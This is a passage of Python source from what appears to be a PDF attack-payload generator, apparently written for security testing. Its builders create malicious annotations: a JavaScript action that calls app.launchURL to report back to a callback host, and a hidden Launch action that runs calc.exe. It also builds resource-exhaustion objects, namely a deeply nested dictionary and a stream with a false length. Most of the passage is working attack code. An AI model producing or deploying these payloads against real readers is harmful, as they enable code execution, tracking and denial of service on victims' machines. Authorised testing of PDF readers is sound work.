            NameObject('/Length'): NumberObject(len(xfa_stream._data))
        })
        
        # Create form dictionary
        form_dict = DictionaryObject({
            NameObject('/XFA'): xfa_stream
        })
        
        return form_dict

class AnnotationBuilder:
    """Builder for creating malicious annotation payloads"""
    
    def __init__(self, callback_url: str, test_id: str):
        self.callback_url = callback_url
        self.test_id = test_id
    
    def create_javascript_annotation(self) -> DictionaryObject:
        """Create an annotation with JavaScript execution"""
        return DictionaryObject({
            NameObject('/Type'): NameObject('/Annot'),
            NameObject('/Subtype'): NameObject('/Link'),
            NameObject('/Rect'): ArrayObject([
                NumberObject(0), NumberObject(0),
                NumberObject(100), NumberObject(100)
            ]),
            NameObject('/A'): DictionaryObject({
                NameObject('/S'): NameObject('/JavaScript'),
                NameObject('/JS'): TextStringObject(
                    f'app.launchURL("{self.callback_url}/annot/{self.test_id}");'
                )
            })
        })
    
    def create_launch_action(self) -> DictionaryObject:
        """Create an annotation with a launch action"""
        return DictionaryObject({
            NameObject('/Type'): NameObject('/Annot'),
            NameObject('/Subtype'): NameObject('/Link'),
            NameObject('/Rect'): ArrayObject([
                NumberObject(0), NumberObject(0),
                NumberObject(0), NumberObject(0)
            ]),
            NameObject('/F'): NumberObject(2),  # Hidden flag
            NameObject('/A'): DictionaryObject({
                NameObject('/Type'): NameObject('/Action'),
                NameObject('/S'): NameObject('/Launch'),
                NameObject('/F'): TextStringObject('calc.exe')
            })
        })

class ResourceExhaustionBuilder:
    """Builder for creating resource exhaustion payloads"""
    
    @staticmethod
    def create_nested_dictionary(depth: int = 100) -> DictionaryObject:
        """Create a deeply nested dictionary structure"""
        current_dict = DictionaryObject()
        root_dict = current_dict
        
        for i in range(depth):
            new_dict = DictionaryObject()
            current_dict[NameObject(f'/Key{i}')] = new_dict
            current_dict = new_dict
        
        return root_dict
    
    @staticmethod
    def create_large_stream() -> StreamObject:
        """Create a stream object with invalid length"""
        stream = StreamObject()
        stream._data = b"A" * 1000000  # 1MB of data
        stream.update({
            NameObject('/Length'): NumberObject(999999999)  # Invalid length
        })
        return stream

if __name__ == "__main__":
    main()
